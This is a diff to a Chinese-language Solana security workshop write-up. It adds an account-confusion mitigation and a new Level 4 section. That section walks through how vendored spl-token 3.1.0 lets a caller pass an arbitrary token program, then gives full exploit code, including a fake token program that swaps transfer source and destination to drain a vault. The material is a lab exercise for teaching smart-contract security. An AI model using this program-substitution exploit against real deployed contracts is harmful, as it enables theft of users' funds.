@@ -29,6 +29,8 @@ $ docker run --name breakpoint-workshop -p 2222:22 -p 8383:80 -e PASSWORD="passw
     RUST_BACKTRACE=1 cargo run --bin level0
     ```
 
+- Docker 内有部分命令缺失（e.g. `bash` >m<）可能导致构建失败，可在本地构建后上传
+
 ### Exploit Outline
 
 初始持有 1 SOL，目标是获得更多的 SOL
@@ -291,48 +293,50 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
 
 - 查看 `TipInstruction`，初步了解程序的功能，任何人可以创建 `TipPool` 来接收 tips，资金存储在 `Vault` 中，`withdraw` 时将依据 `TipPool` 中存储的 `value`
 
-    ```rs
-    pub enum TipInstruction {
-        /// Initialize a vault
-        ///
-        /// Passed accounts:
-        ///
-        /// (1) Vault account
-        /// (2) initializer (must sign)
-        /// (3) Rent sysvar
-        /// (4) System Program
-        Initialize {
-            seed: u8,
-            fee: f64,
-            fee_recipient: Pubkey,
-        },
-        /// Initialize a TipPool
-        ///
-        /// Passed accounts:
-        ///
-        /// (1) Vault account
-        /// (2) withdraw_authority (must sign)
-        /// (3) Pool account
-        CreatePool,
-        /// Tip
-        ///
-        /// Passed accounts:
-        ///
-        /// (1) Vault account
-        /// (2) Pool
-        /// (3) Tip Source
-        /// (4) System program
-        Tip { amount: u64 },
-        /// Withdraw from Pool
-        ///
-        /// Passed accounts:
-        ///
-        /// (1) Vault account
-        /// (2) Pool account
-        /// (3) withdraw_authority (must sign)
-        Withdraw { amount: u64 },
-    }
-    ```
+    ??? note "TipInstruction"
+
+        ```rs
+        pub enum TipInstruction {
+            /// Initialize a vault
+            ///
+            /// Passed accounts:
+            ///
+            /// (1) Vault account
+            /// (2) initializer (must sign)
+            /// (3) Rent sysvar
+            /// (4) System Program
+            Initialize {
+                seed: u8,
+                fee: f64,
+                fee_recipient: Pubkey,
+            },
+            /// Initialize a TipPool
+            ///
+            /// Passed accounts:
+            ///
+            /// (1) Vault account
+            /// (2) withdraw_authority (must sign)
+            /// (3) Pool account
+            CreatePool,
+            /// Tip
+            ///
+            /// Passed accounts:
+            ///
+            /// (1) Vault account
+            /// (2) Pool
+            /// (3) Tip Source
+            /// (4) System program
+            Tip { amount: u64 },
+            /// Withdraw from Pool
+            ///
+            /// Passed accounts:
+            ///
+            /// (1) Vault account
+            /// (2) Pool account
+            /// (3) withdraw_authority (must sign)
+            Withdraw { amount: u64 },
+        }
+        ```
 
 - 两种账户类型，`Vault` 和 `TipPool`，注意到 `Vault` 的字段恰好能覆盖 `TipPool` 的字段
     - `deserialize` 根据给定数据类型解析，并更新 buffer，使其指向剩余字节
@@ -435,6 +439,18 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
     }
     ```
 
+- 可增加类型字段来避免 *Account Confusion*
+
+    ```rs
+    // e.g.
+    pub struct TipPool {
+        pub atype: u8,  // contain a unique identifier for this account type
+        pub withdraw_authority: Pubkey,
+        pub value: u64,
+        pub vault: Pubkey,
+    }
+    ```
+
 ### Exploit
 
 ```rs
@@ -472,3 +488,161 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
 - [Solana Smart Contracts: Common Pitfalls and How to Avoid Them](https://blog.neodyme.io/posts/solana_common_pitfalls/#solana-account-confusions)
 - [BorshDeserialize in borsh::de - Rust](https://docs.rs/borsh/latest/borsh/de/trait.BorshDeserialize.html)
 - [Program Derived Addresses (PDAs) | Solana Cookbook](https://solanacookbook.com/core-concepts/pdas.html)
+
+## Level 4 - SPL[^spl]-Token Vault
+
+- 每一种类型的 SPL 代币通过创建一个 `mint` 账户来声明，`mint` 账户存储代币元数据，每个 SPL 代币账户关联 `mint` 账户
+    - *Associated Token Account Program* 根据用户系统账户和 `mint` 账户确定性地派生 SPL 代币账户。无论创建者，`create_associated_token_account` 的所有者都是对应用户的系统账户
+    - 若 SPL 代币账户关联原生 `mint`（SOL），则账户 SOL 余额与代币余额保持一致
+- `spl_token` 在版本 3.1.1 有重要变更 👀
+
+    ```rs
+    // There's a mitigation for this bug in spl-token 3.1.1
+    // vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet
+    use vendored_spl_token as spl_token;
+    ```
+
+- 对比 3.1.1 和 3.1.0 的源码[^comparing]，发现版本 3.1.1 主要新增了对提供的 SPL 代币程序 ID 的检查 `check_program_account(token_program_id)?;`，而 `token_program_id` 是可控的，那么在版本 3.1.0 可以部署恶意程序来操控数据
+- 由 `wallet_owner` 的公钥和 `wallet_program` 获得程序派生地址 `wallet_address`，是持有 SPL 代币的账户地址
+- `withdraw()` 中调用了 `spl_token::instruction::transfer_checked()`，那么将 `spl_token` 指向可控程序，从而能够交换 `source` 和 `destination`
+
+    ```rs
+    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
+        msg!("withdraw {}", amount);
+        let account_info_iter = &mut accounts.iter();
+        let wallet_info = next_account_info(account_info_iter)?;
+        let authority_info = next_account_info(account_info_iter)?;
+        let owner_info = next_account_info(account_info_iter)?;
+        let destination_info = next_account_info(account_info_iter)?;
+        let mint = next_account_info(account_info_iter)?;
+        let spl_token = next_account_info(account_info_iter)?;
+
+        let (wallet_address, _) = get_wallet_address(owner_info.key, program_id);
+        let (authority_address, authority_seed) = get_authority(program_id);
+
+        assert_eq!(wallet_info.key, &wallet_address);
+        assert_eq!(authority_info.key, &authority_address);
+        assert!(owner_info.is_signer, "owner must sign!");
+
+        let decimals = mint.data.borrow()[44];
+
+        invoke_signed(
+            &spl_token::instruction::transfer_checked(
+                &spl_token.key,
+                &wallet_info.key,
+                mint.key,
+                destination_info.key,
+                authority_info.key,
+                &[],    // signer_pubkeys
+                amount,
+                decimals,
+            ).unwrap(),
+            &[
+                wallet_info.clone(),
+                destination_info.clone(),
+                authority_info.clone(),
+                mint.clone(),
+            ],
+            &[&[&[authority_seed]]],    // 当 signer_pubkeys 为空时，由 authority 签名
+            // 根据 bump seed 派生出的 account_info 中的账户作为 signer
+        )?;
+
+        Ok(())
+    }
+    ```
+
+### Exploit
+
+```rs
+// pocs/src/bin/level4.rs
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    let fake_spl_token_program = env.deploy_program("target/deploy/level4_poc_contract.so");
+    let hacker_wallet = level4::get_wallet_address(
+        &challenge.hacker.pubkey(),
+        &challenge.wallet_program
+    ).0;
+    assert_tx_success(env.execute_as_transaction(
+        &[level4::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+            challenge.mint
+        )], 
+        &[&challenge.hacker]
+    ));
+    env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false), // wallet_info
+                AccountMeta::new_readonly(level4::get_authority(&challenge.wallet_program).0, false), // authority_info
+                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // owner_info
+                AccountMeta::new(challenge.wallet_address, false), // destination_info
+                AccountMeta::new_readonly(spl_token::id(), false), // mint
+                // All the accounts that fake_spl_token_program::TransferChecked needs need to be
+                // included, including the spl_token program being invoked. Since mint is not required
+                // by spl_token::instruction::transfer, we use mint to include spl_token::id()
+                AccountMeta::new_readonly(fake_spl_token_program, false), // spl_token
+            ],
+            data: level4::WalletInstruction::Withdraw { amount: sol_to_lamports(1_000_000.0) }.try_to_vec().unwrap(),
+        }],
+        &[&challenge.hacker]
+    ).print_named("Hacker: withdraw");
+}
+```
+
+```rs
+// level4-poc-contract/src/lib.rs
+use solana_program::{
+    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, program::invoke,
+    pubkey::Pubkey,
+};
+
+use spl_token::instruction::{ TokenInstruction, transfer };
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    _program_id: &Pubkey,
+    accounts: &[AccountInfo],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    match TokenInstruction::unpack(instruction_data).unwrap() {
+       TokenInstruction::TransferChecked { amount, .. } => {
+            let source = &accounts[0];
+            let mint = &accounts[1];
+            let destination = &accounts[2];
+            let authority = &accounts[3];
+            invoke(
+                &transfer(
+                    mint.key, // token_program_id
+                    destination.key, // source_pubkey
+                    source.key, // destination_pubkey
+                    authority.key,  // It's already signed by the wallet program, so `invoke` is used
+                    &[],
+                    amount,
+                ).unwrap(),
+                // Order doesn't matter
+                &[
+                    source.clone(),
+                    destination.clone(),
+                    authority.clone(),
+                ],
+            )
+        }
+        _ => Ok(())
+    }
+}
+```
+
+### 参考资料
+
+- [Supporting the SPL Token Standard](https://docs.solana.com/integrations/exchange#supporting-the-spl-token-standard)
+- [Associated Token Account Program | Solana Program Library Docs](https://spl.solana.com/associated-token-account)
+- [TokenInstruction in spl_token::instruction - Rust](https://docs.rs/spl-token/latest/spl_token/instruction/enum.TokenInstruction.html#)
+- [spl_token::instruction - Rust](https://docs.rs/spl-token/latest/spl_token/instruction/index.html)
+- [instruction.rs - source](https://docs.rs/spl-token/3.1.0/src/spl_token/instruction.rs.html#981-1010)
+- [invoke_signed in solana_sdk::program - Rust](https://docs.rs/solana-sdk/latest/solana_sdk/program/fn.invoke_signed.html)
+- [Program examples written in Rust](https://github.com/solana-labs/solana-program-library/blob/master/examples/rust/README.md)
+
+[^spl]: Solana Program Library
+[^comparing]: https://github.com/solana-labs/solana-program-library/compare/token-v3.1.0...token-v3.1.1?diff=unified
